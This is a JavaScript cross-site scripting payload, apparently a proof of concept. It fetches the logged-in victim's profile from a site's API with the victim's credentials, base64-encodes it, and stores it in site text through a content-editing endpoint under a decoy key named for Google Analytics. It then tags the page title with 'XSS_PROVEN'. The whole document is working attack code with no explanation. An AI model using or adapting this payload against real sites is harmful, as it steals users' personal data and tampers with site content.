(function () {
  try {
    var req1 = new XMLHttpRequest();

    req1.open('GET', '/api/profile/GetProfile', true);
    req1.withCredentials = true;
    req1.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

    req1.onload = function () {
      try {
        if (req1.status < 200 || req1.status >= 300) {
          document.title = '[HEALTH_GET_' + req1.status + '] ' + document.title;
          return;
        }

        var value = btoa(req1.responseText || 'unknown');
        var ts = Date.now();

        var body = JSON.stringify({
          name: 'HIDE_GOOGLE_ANALYTICS',
          langId: 1,
          brandId: 68,
          stringValue: value
        });

        var req2 = new XMLHttpRequest();
        req2.open('POST', '/api/Content/AddSiteText', true);
        req2.withCredentials = true;
        req2.setRequestHeader('Content-Type', 'application/json');
        req2.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

        req2.onload = function () {
          document.title = '[XSS_PROVEN_' + ts + '] ' + document.title;
        };

        req2.send(body);
      } catch (e) {
        document.title = '[XSS_ERR] ' + document.title;
      }
    };

    req1.onerror = function () {
      document.title = '[HEALTH_GET_ERR] ' + document.title;
    };

    req1.send();
  } catch (e) {
    document.title = '[XSS_ERR] ' + document.title;
  }
})();

